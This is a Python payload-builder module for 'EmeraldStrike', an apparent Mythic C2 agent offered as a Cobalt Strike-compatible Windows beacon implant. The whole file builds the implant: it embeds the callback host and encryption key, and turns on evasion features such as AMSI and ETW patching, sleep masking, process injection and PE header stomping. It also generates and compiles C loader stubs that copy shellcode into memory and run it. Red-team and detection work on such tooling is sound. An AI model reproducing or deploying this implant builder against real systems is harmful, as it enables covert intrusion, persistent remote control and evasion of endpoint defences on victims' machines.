import pathlib
import os
import re
import struct
import shutil
import tempfile
import asyncio
import zipfile
import logging
import json
import io
import base64 as b64mod

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

logger = logging.getLogger("emeraldstrike.builder")


async def _run_with_timeout(proc, timeout, label):
    try:
        return await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        raise RuntimeError(f"{label} timed out after {timeout}s")


def _make_env():
    env = os.environ.copy()
    extra = [d for d in ["/usr/bin", "/usr/local/bin"] if os.path.isdir(d)]
    if extra:
        env["PATH"] = os.pathsep.join(extra) + os.pathsep + env.get("PATH", "")
    return env


class EmeraldStrike(PayloadType):
    name = "emeraldstrike"
    file_extension = "bin"
    author = "@Lavender-exe"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "CS 4.13-compatible PIC beacon agent with UDRL, sleepmask, and BOF support."
    supports_dynamic_loading = True
    c2_profiles = ["http", "smb"]
    mythic_encrypts = True
    translation_container = "EmeraldStrikeTranslator"

    agent_path = pathlib.Path(__file__).resolve().parent.parent
    agent_icon_path = agent_path / "assets" / "emeraldstrike_logo.png"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
        BuildParameter(
            name="output_type",
            group_name="Main",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["bin", "dll", "exe"],
            default_value="bin",
            description="Output format: bin (raw PIC shellcode), dll (Windows DLL), exe (Windows EXE)",
        ),
        BuildParameter(
            name="architecture",
            group_name="Main",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["x64", "x86"],
            default_value="x64",
            description="Target architecture",
        ),
        BuildParameter(
            name="debug",
            group_name="Main",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Include debug output",
        ),
        BuildParameter(
            name="http_library",
            group_name="Main",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["wininet", "winhttp"],
            default_value="wininet",
            description="HTTP library: WinInet (IE/Edge stack) or WinHTTP",
        ),
        BuildParameter(
            name="loader_type",
            group_name="UDRL",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["default", "udrl-vs"],
            default_value="default",
            description="Loader type: default (raw PIC) or udrl-vs (User Defined Reflective Loader kit)",
        ),
        BuildParameter(
            name="udrl_vs_file",
            group_name="UDRL",
            parameter_type=BuildParameterType.File,
            description="UDRL-VS kit ZIP (loader/ + mask/ with Makefiles and sources)",
            required=False,
            hide_conditions=[
                HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="udrl-vs"),
            ],
        ),
        BuildParameter(
            name="sleep_mask",
            group_name="Evasion",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["none", "default", "ekko"],
            default_value="default",
            description="Sleep mask: none (plain sleep), default (XOR mask), ekko (timer-queue ROP chain, x64 only)",
            hide_conditions=[
                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
            ],
        ),
        BuildParameter(
            name="injection_technique",
            group_name="Evasion",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["crt", "apc", "section", "custom"],
            default_value="crt",
            description="Injection technique: CRT (CreateRemoteThread), APC (Early Bird), Section (NtCreateSection), Custom (Operator Defined)",
        ),
        BuildParameter(
            name="cleanup",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Free the initial shellcode allocation after the agent is loaded (stage.cleanup)",
            hide_conditions=[
                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
            ],
        ),
        BuildParameter(
            name="stomppe",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Zero the PE headers of the agent DLL in memory after loading (stage.stomppe)",
        ),
        BuildParameter(
            name="obfuscate",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Obfuscate the agent DLL in memory: XOR non-executable sections on load (stage.obfuscate)",
        ),
        BuildParameter(
            name="userwx",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Allow RWX memory for agent allocations (stage.userwx). When false, uses RW then flips to RX.",
        ),
        BuildParameter(
            name="smartinject",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Use RW→RX split permissions for process injection instead of RWX (stage.smartinject)",
        ),
        BuildParameter(
            name="patch_amsi",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Patch AMSI at agent init",
        ),
        BuildParameter(
            name="patch_etw",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Patch ETW at agent init",
        ),
        BuildParameter(
            name="beacon_gate",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Route Win32 API calls through sleepmask ROP chain for CFG compatibility and stack spoofing (requires UDRL sleepmask)",
            hide_conditions=[
                HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="udrl-vs"),
            ],
        ),
    ]

    build_steps = [
        BuildStep(step_name="Gathering", step_description="Copying agent source"),
        BuildStep(step_name="Configuring", step_description="Stamping config into agent"),
        BuildStep(step_name="Compiling", step_description="Building PIC shellcode"),
        BuildStep(step_name="Wrapping", step_description="Producing final artifact"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            output_type = self.get_parameter("output_type")
            arch = self.get_parameter("architecture")
            debug = self.get_parameter("debug")

            agent_build_path = tempfile.mkdtemp()
            src_path = str(self.agent_code_path)
            dst_path = os.path.join(agent_build_path, "agent_code")
            shutil.copytree(src_path, dst_path)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering",
                StepStdout="Copied agent source to build directory",
                StepSuccess=True,
            ))

            # Extract C2 config
            c2_profile_name = ""
            c2_params = {}
            for c2 in self.c2info:
                c2_profile_name = c2.get_c2profile()["name"]
                c2_params = c2.get_parameters_dict()
                break

            transport_define = ""
            if c2_profile_name == "http":
                transport_define = "#define HTTP_TRANSPORT"
            elif c2_profile_name == "smb":
                transport_define = "#define SMB_TRANSPORT"

            config_bytes = self._serialize_config(c2_profile_name, c2_params)
            config_hex = ", ".join(f"0x{b:02x}" for b in config_bytes)

            # Stamp config.h
            config_h_path = os.path.join(dst_path, "include", "config.h")
            with open(config_h_path, "r") as f:
                config_content = f.read()

            selected_cmds = {c.lower() for c in self.commands.get_commands()}
            all_cmd_macros = re.findall(r'#define (INCLUDE_CMD_\w+)', config_content)
            cmd_defines = []
            for macro in all_cmd_macros:
                name = macro.replace("INCLUDE_CMD_", "").lower()
                if name in selected_cmds:
                    cmd_defines.append(f"#define {macro}")
                else:
                    cmd_defines.append(f"// #undef {macro}")
            cmd_defines_str = "\n".join(cmd_defines)

            evasion_defines = self._build_evasion_defines()

            # Determine build mode early; UDRL needs mask built before config stamp
            try:
                loader_type = self.get_parameter("loader_type")
            except Exception:
                loader_type = "default"

            is_udrl = loader_type == "udrl-vs"

            # Build sleepmask COFF if UDRL mode. Must happen before config stamp.
            sleepmask_coff_define = ""
            if is_udrl:
                mask_coff_bytes = await self._build_sleepmask_coff(arch, agent_build_path)
                if mask_coff_bytes:
                    coff_hex = ", ".join(f"0x{b:02x}" for b in mask_coff_bytes)
                    sleepmask_coff_define = (
                        f"static const unsigned char SLEEPMASK_COFF[] = {{ {coff_hex} }};\n"
                        f"#define SLEEPMASK_COFF_SIZE {len(mask_coff_bytes)}"
                    )
                    logger.info(f"Sleepmask COFF embedded: {len(mask_coff_bytes)} bytes")
                else:
                    logger.warning("Sleepmask COFF build failed or not found; sleep will use plain Sleep()")

            config_content = config_content.replace("%TRANSPORT_DEFINE%", transport_define)
            config_content = config_content.replace("%CONFIG_BYTES%", config_hex)
            config_content = config_content.replace("%COMMAND_DEFINES%", cmd_defines_str)
            config_content = config_content.replace("%EVASION_DEFINES%", evasion_defines)
            config_content = config_content.replace("%SLEEPMASK_COFF_DEFINE%", sleepmask_coff_define)

            with open(config_h_path, "w") as f:
                f.write(config_content)

            commands = list(selected_cmds)
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring",
                StepStdout=f"Config stamped: {c2_profile_name} transport, {len(commands)} commands"
                           + (f", sleepmask COFF {len(mask_coff_bytes)} bytes" if is_udrl and mask_coff_bytes else ""),
                StepSuccess=True,
            ))
            is_dll = output_type == "dll"

            if is_udrl or is_dll:
                make_target = f"dll-{arch}"
            elif debug:
                make_target = f"{arch}-debug"
            else:
                make_target = arch

            os.makedirs(os.path.join(dst_path, "bin", "obj"), exist_ok=True)

            proc = await asyncio.create_subprocess_exec(
                "make", make_target, f"DEFINES=-DDEBUG" if debug else "DEFINES=",
                cwd=dst_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout_bytes, stderr_bytes = await _run_with_timeout(proc, 600, "make compile")
            stdout_text = stdout_bytes.decode(errors="replace")
            stderr_text = stderr_bytes.decode(errors="replace")

            if proc.returncode != 0:
                resp.status = BuildStatus.Error
                resp.build_stderr = stderr_text
                resp.build_message = f"Compilation failed:\n{stdout_text}\n{stderr_text}"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=stdout_text,
                    StepStderr=stderr_text,
                    StepSuccess=False,
                ))
                return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout=stdout_text,
                StepSuccess=True,
            ))

            if is_udrl:
                # UDRL mode: read compiled DLL and link with UDRL kit
                dll_path = os.path.join(dst_path, "bin", f"emeraldstrike.{arch}.dll")
                with open(dll_path, "rb") as f:
                    dll_bytes = f.read()

                udrl_result = await self._link_with_udrl_vs(dll_bytes, arch, agent_build_path)
                if udrl_result is None:
                    resp.status = BuildStatus.Error
                    resp.build_message = "UDRL-VS linking failed"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Wrapping",
                        StepStdout="UDRL-VS linking failed",
                        StepSuccess=False,
                    ))
                    return resp

                if output_type in ("exe", "dll"):
                    wrapped = await self._wrap_in_pe(udrl_result, output_type, arch, agent_build_path, debug)
                    if wrapped is None:
                        resp.status = BuildStatus.Error
                        resp.build_message = "UDRL PE wrapping failed"
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Wrapping",
                            StepStdout="UDRL PE wrapping failed",
                            StepSuccess=False,
                        ))
                        return resp
                    resp.payload = wrapped
                    resp.build_message = f"EmeraldStrike {arch} UDRL-VS {output_type}: {len(wrapped)} bytes"
                else:
                    resp.payload = udrl_result
                    resp.build_message = f"EmeraldStrike {arch} UDRL-VS shellcode: {len(udrl_result)} bytes"

            elif is_dll:
                # DLL mode: return the compiled PE DLL directly
                dll_path = os.path.join(dst_path, "bin", f"emeraldstrike.{arch}.dll")
                with open(dll_path, "rb") as f:
                    dll_bytes = f.read()
                resp.payload = dll_bytes
                resp.build_message = f"EmeraldStrike {arch} dll: {len(dll_bytes)} bytes"

            else:
                # PIC mode: read the extracted .text shellcode
                bin_path = os.path.join(dst_path, "bin", f"emeraldstrike.{arch}.bin")
                with open(bin_path, "rb") as f:
                    shellcode = f.read()

                if output_type == "bin":
                    resp.payload = shellcode
                    resp.build_message = f"EmeraldStrike {arch} PIC shellcode: {len(shellcode)} bytes"
                else:
                    wrapped = await self._wrap_in_pe(shellcode, output_type, arch, agent_build_path, debug)
                    if wrapped is None:
                        resp.status = BuildStatus.Error
                        resp.build_message = "PE wrapping failed"
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Wrapping",
                            StepStdout="PE wrapping failed",
                            StepSuccess=False,
                        ))
                        return resp
                    resp.payload = wrapped
                    resp.build_message = f"EmeraldStrike {arch} {output_type}: {len(wrapped)} bytes"

            ext_map = {"bin": "bin", "exe": "exe", "dll": "dll"}
            resp.updated_filename = f"emeraldstrike.{ext_map.get(output_type, 'bin')}"

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Wrapping",
                StepStdout=resp.build_message,
                StepSuccess=True,
            ))

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = str(e)
            resp.build_message = f"Build error: {str(e)}"

        return resp

    def _serialize_config(self, c2_profile, c2_params):
        buf = b""

        uuid_bytes = self.uuid.encode("utf-8")[:36].ljust(36, b"\x00")
        buf += uuid_bytes

        aes_key = b"\x00" * 32
        aes_psk = c2_params.get("AESPSK", {})
        if isinstance(aes_psk, dict) and aes_psk.get("enc_key"):
            aes_key = b64mod.b64decode(aes_psk["enc_key"])[:32].ljust(32, b"\x00")
        elif isinstance(aes_psk, str) and aes_psk not in ("", "none"):
            try:
                aes_key = b64mod.b64decode(aes_psk)[:32].ljust(32, b"\x00")
            except Exception:
                pass
        buf += aes_key

        interval = int(c2_params.get("callback_interval", 10)) * 1000
        buf += struct.pack(">I", interval)

        jitter = int(c2_params.get("callback_jitter", 23))
        buf += struct.pack(">I", jitter)

        buf += struct.pack(">I", 0)  # killdate

        if c2_profile == "http":
            host = c2_params.get("callback_host", "")
            if "://" in host:
                host = host.split("://", 1)[1]
            if host.endswith("/"):
                host = host[:-1]
            buf += self._pack_string(host)

            port = int(c2_params.get("callback_port", 80))
            buf += struct.pack(">I", port)

            use_ssl = 1 if "https" in c2_params.get("callback_host", "") else 0
            buf += struct.pack("B", use_ssl)

            headers = c2_params.get("headers", {})
            if isinstance(headers, str):
                import json as _json
                try:
                    headers = _json.loads(headers)
                except Exception:
                    headers = {}
            ua = headers.get("User-Agent", c2_params.get("USER_AGENT", "Mozilla/5.0"))
            buf += self._pack_string(ua)

            get_uri = c2_params.get("get_uri", "index")
            post_uri = c2_params.get("post_uri", "data")
            buf += self._pack_string(get_uri)
            buf += self._pack_string(post_uri)

            query_param = c2_params.get("query_path_name", "q")
            buf += self._pack_string(query_param)

            proxy_host = c2_params.get("proxy_host", "")
            if proxy_host:
                buf += struct.pack("B", 1)
                buf += self._pack_string(proxy_host)
                buf += struct.pack(">I", int(c2_params.get("proxy_port", 8080)))
                buf += self._pack_string(c2_params.get("proxy_user", ""))
                buf += self._pack_string(c2_params.get("proxy_pass", ""))
            else:
                buf += struct.pack("B", 0)

        elif c2_profile == "smb":
            pipename = c2_params.get("pipename", "")
            buf += self._pack_string(pipename)

        return buf

    def _pack_string(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        return struct.pack(">I", len(s)) + s

    def _build_evasion_defines(self):
        defines = []

        try:
            mask_type = self.get_parameter("sleep_mask")
        except Exception:
            mask_type = "default"

        try:
            loader_type = self.get_parameter("loader_type")
        except Exception:
            loader_type = "default"

        if loader_type == "udrl-vs":
            mask_type = "udrl"

        mask_map = {
            "none": "MASK_NONE",
            "default": "MASK_DEFAULT",
            "ekko": "MASK_EKKO",
            "udrl": "MASK_UDRL",
        }
        defines.append(f"#define SLEEP_MASK_TYPE {mask_map.get(mask_type, 'MASK_DEFAULT')}")

        try:
            inject = self.get_parameter("injection_technique")
        except Exception:
            inject = "crt"
        inject_map = {"crt": "INJECT_CRT", "apc": "INJECT_APC", "section": "INJECT_SECTION", "custom": "INJECT_CUSTOM"}
        defines.append(f"#define INJECTION_TECHNIQUE {inject_map.get(inject, 'INJECT_CRT')}")

        try:
            cleanup = self.get_parameter("cleanup")
        except Exception:
            cleanup = True
        if cleanup and loader_type != "udrl-vs":
            defines.append("#define INCLUDE_EVASION_CLEANUP")

        try:
            stomppe = self.get_parameter("stomppe")
        except Exception:
            stomppe = True
        if stomppe:
            defines.append("#define INCLUDE_EVASION_STOMPPE")

        try:
            obfuscate = self.get_parameter("obfuscate")
        except Exception:
            obfuscate = False
        if obfuscate:
            defines.append("#define INCLUDE_EVASION_OBFUSCATE")

        try:
            userwx = self.get_parameter("userwx")
        except Exception:
            userwx = False
        if userwx:
            defines.append("#define EVASION_USERWX")

        try:
            smartinject = self.get_parameter("smartinject")
        except Exception:
            smartinject = True
        if smartinject:
            defines.append("#define INCLUDE_EVASION_SMARTINJECT")

        try:
            patch_amsi = self.get_parameter("patch_amsi")
        except Exception:
            patch_amsi = True
        if patch_amsi:
            defines.append("#define INCLUDE_EVASION_AMSI")

        try:
            patch_etw = self.get_parameter("patch_etw")
        except Exception:
            patch_etw = True
        if patch_etw:
            defines.append("#define INCLUDE_EVASION_ETW")

        try:
            beacon_gate = self.get_parameter("beacon_gate")
        except Exception:
            beacon_gate = True
        if beacon_gate:
            defines.append("#define BEACON_GATE_ENABLED 1")

        try:
            http_lib = self.get_parameter("http_library")
        except Exception:
            http_lib = "wininet"
        if http_lib == "wininet":
            defines.append("#define USE_WININET")
        else:
            defines.append("#define USE_WINHTTP")

        return "\n".join(defines)

    async def _wrap_in_pe(self, shellcode, output_type, arch, build_path, debug=False):
        sc_array = ", ".join(f"0x{b:02x}" for b in shellcode)

        try:
            userwx = self.get_parameter("userwx")
        except Exception:
            userwx = False
        # The agent's PIC entry keeps its INSTANCE struct (__Instance/__InstanceStorage,
        # 16KB) inside .text and writes to it at runtime, so the shellcode region must
        # be writable. PAGE_EXECUTE_READ faults on the first instance write (AV at the
        # `mov [__Instance], rcx` in _start). Always allocate RWX in the PIC wrapper.
        exec_prot = "PAGE_EXECUTE_READWRITE"

        loader_code = f"""
#include <windows.h>

static unsigned char shellcode[] = {{ {sc_array} }};

static void execute_shellcode(void) {{
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;
    memcpy(mem, shellcode, sizeof(shellcode));
    DWORD old;
    VirtualProtect(mem, sizeof(shellcode), {exec_prot}, &old);
    ((void(*)())mem)();
}}
"""
        if output_type == "dll":
            loader_code += """
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        execute_shellcode();
    }
    return TRUE;
}
"""
        else:
            loader_code += """
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    execute_shellcode();
    return 0;
}
"""
        stamped_path = os.path.join(build_path, "loader.c")
        with open(stamped_path, "w") as f:
            f.write(loader_code)

        if arch == "x64":
            cc = "x86_64-w64-mingw32-gcc"
        else:
            cc = "i686-w64-mingw32-gcc"

        ext = "dll" if output_type == "dll" else "exe"
        out_path = os.path.join(build_path, f"emeraldstrike.{ext}")

        cmd = [cc, stamped_path, "-o", out_path, "-s", "-Os", "-w",
               "-fno-ident", "-fno-asynchronous-unwind-tables",
               "-Wl,--strip-all,--no-insert-timestamp",
               "-lkernel32", "-lntdll"]
        if output_type == "dll":
            cmd.append("-shared")
        elif not debug:
            cmd.append("-mwindows")

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await _run_with_timeout(proc, 120, "loader compile")
        if proc.returncode != 0:
            logger.error(f"PE wrap failed: {stderr.decode(errors='replace')}")
            return None

        with open(out_path, "rb") as f:
            return f.read()

    async def _extract_udrl_kit(self, build_path):
        """Extract UDRL kit ZIP and return (kit_root, loader_dir, mask_dir)."""
        kit_dir = os.path.join(build_path, "udrl_vs")
        os.makedirs(kit_dir, exist_ok=True)

        vs_file_id = self.get_parameter("udrl_vs_file")
        if not vs_file_id:
            logger.error("UDRL-VS requires an uploaded kit ZIP")
            return None, None, None

        zip_content = None
        if os.path.isfile(vs_file_id):
            logger.info(f"Reading UDRL kit from local path: {vs_file_id}")
            with open(vs_file_id, "rb") as f:
                zip_content = f.read()
        else:
            vs_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileID=vs_file_id,
            ))
            if not vs_resp.Success:
                logger.error(f"Failed to fetch UDRL-VS kit: {vs_resp.Error}")
                return None, None, None
            zip_content = vs_resp.Content

        zip_buf = io.BytesIO(zip_content)
        with zipfile.ZipFile(zip_buf, 'r') as z:
            z.extractall(kit_dir)

        # Fix execute permissions on scripts after extraction
        for root, dirs, files in os.walk(kit_dir):
            for f in files:
                if f.endswith('.py') or f.endswith('.sh'):
                    os.chmod(os.path.join(root, f), 0o755)

        kit_root = kit_dir
        loader_dir = os.path.join(kit_dir, "loader")
        if not os.path.isdir(loader_dir):
            for entry in os.listdir(kit_dir):
                candidate = os.path.join(kit_dir, entry, "loader")
                if os.path.isdir(candidate):
                    loader_dir = candidate
                    kit_root = os.path.join(kit_dir, entry)
                    break

        if not os.path.isdir(loader_dir):
            logger.error("No loader/ directory found in UDRL kit")
            return None, None, None

        mask_dir = os.path.join(kit_root, "mask")
        if not os.path.isdir(mask_dir):
            mask_dir = None

        return kit_root, loader_dir, mask_dir

    async def _build_sleepmask_coff(self, arch, build_path):
        """Build sleepmask COFF from the UDRL kit and return the .o bytes."""
        kit_root, loader_dir, mask_dir = await self._extract_udrl_kit(build_path)
        if not mask_dir:
            logger.warning("No mask/ directory in UDRL kit - skipping sleepmask")
            return None

        os.makedirs(os.path.join(mask_dir, "dist"), exist_ok=True)

        is_debug = self.get_parameter("debug")
        make_target = "debug" if is_debug else "all"
        make_proc = await asyncio.create_subprocess_exec(
            "make", make_target,
            cwd=mask_dir, env=_make_env(),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        make_stdout, make_stderr = await _run_with_timeout(make_proc, 120, "sleepmask compile")
        if make_proc.returncode != 0:
            logger.error(f"Sleepmask compile failed:\n{make_stdout.decode(errors='replace')}\n{make_stderr.decode(errors='replace')}")
            return None

        # Look for the output COFF: dist/sleepmask.x64.o
        dist_dir = os.path.join(mask_dir, "dist")
        mask_coff = None
        for f in os.listdir(dist_dir):
            if f.endswith(f".{arch}.o") or f.endswith(".o"):
                mask_coff = os.path.join(dist_dir, f)
                break

        if not mask_coff:
            logger.error(f"Sleepmask produced no .o in {dist_dir}")
            return None

        with open(mask_coff, "rb") as f:
            return f.read()

    async def _link_with_udrl_vs(self, dll_bytes, arch, build_path):
        # Kit should already be extracted by _build_sleepmask_coff; if not, extract now
        kit_dir = os.path.join(build_path, "udrl_vs")
        loader_dir = os.path.join(kit_dir, "loader")
        if not os.path.isdir(loader_dir):
            kit_root, loader_dir, _ = await self._extract_udrl_kit(build_path)
            if not loader_dir:
                logger.error("No loader/ directory found in UDRL kit")
                return None

        os.makedirs(os.path.join(loader_dir, "bin", "obj"), exist_ok=True)

        # Build the UDRL loader as PIC shellcode
        is_debug = self.get_parameter("debug")
        loader_target = "debug" if is_debug else arch
        make_proc = await asyncio.create_subprocess_exec(
            "make", loader_target,
            cwd=loader_dir, env=_make_env(),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        make_stdout, make_stderr = await _run_with_timeout(make_proc, 120, "UDRL loader compile")
        if make_proc.returncode != 0:
            logger.error(f"UDRL loader compile failed:\n{make_stdout.decode(errors='replace')}\n{make_stderr.decode(errors='replace')}")
            return None

        loader_bin = None
        bin_dir = os.path.join(loader_dir, "bin")
        for f in os.listdir(bin_dir):
            if f.endswith(f".{arch}.bin"):
                loader_bin = os.path.join(bin_dir, f)
                break
        if not loader_bin:
            logger.error(f"UDRL loader produced no .{arch}.bin in {bin_dir}")
            return None

        with open(loader_bin, "rb") as f:
            loader_sc = f.read()

        combined = loader_sc + dll_bytes

        # Pad to next page boundary and mark end with egg for cleanup size detection
        # Egg: 0xAB 0xCD 0xEF 0xAB 0xCD 0xEF (same as CS CNA pattern)
        EGG = b"\xab\xcd\xef\xab\xcd\xef"
        combined_sz = len(combined)
        page_size = 0x1000
        combined_sz_rounded = ((combined_sz + page_size - 1) // page_size) * page_size
        padding = combined_sz_rounded - combined_sz - len(EGG)
        if padding < 0:
            combined_sz_rounded += page_size
            padding = combined_sz_rounded - combined_sz - len(EGG)

        result = combined + (b"\x00" * padding) + EGG
        logger.info(
            f"UDRL linked: {len(loader_sc)} loader + {len(dll_bytes)} DLL"
            f" + {padding} pad + {len(EGG)} egg = {len(result)} bytes (page-aligned)"
        )
        return result

    def _wrap_shellcode_in_dll_stub(self, shellcode, arch):
        import subprocess
        import tempfile as tf

        sc_hex = ", ".join(f"0x{b:02x}" for b in shellcode)
        dll_src = f"""
#include <windows.h>
__attribute__((section(".text$Z")))
static unsigned char _payload[] = {{ {sc_hex} }};
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {{ return TRUE; }}
"""
        with tf.TemporaryDirectory() as td:
            src_path = os.path.join(td, "stub.c")
            out_path = os.path.join(td, "stub.dll")
            with open(src_path, "w") as f:
                f.write(dll_src)

            cc = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
            result = subprocess.run(
                [cc, src_path, "-o", out_path, "-shared", "-s", "-Os",
                 "-fno-ident", "-nostdlib", "-lkernel32",
                 "-Wl,--strip-all,--no-insert-timestamp"],
                capture_output=True, timeout=30,
            )
            if result.returncode != 0:
                raise RuntimeError(f"DLL stub compile failed: {result.stderr.decode(errors='replace')}")

            with open(out_path, "rb") as f:
                return f.read()
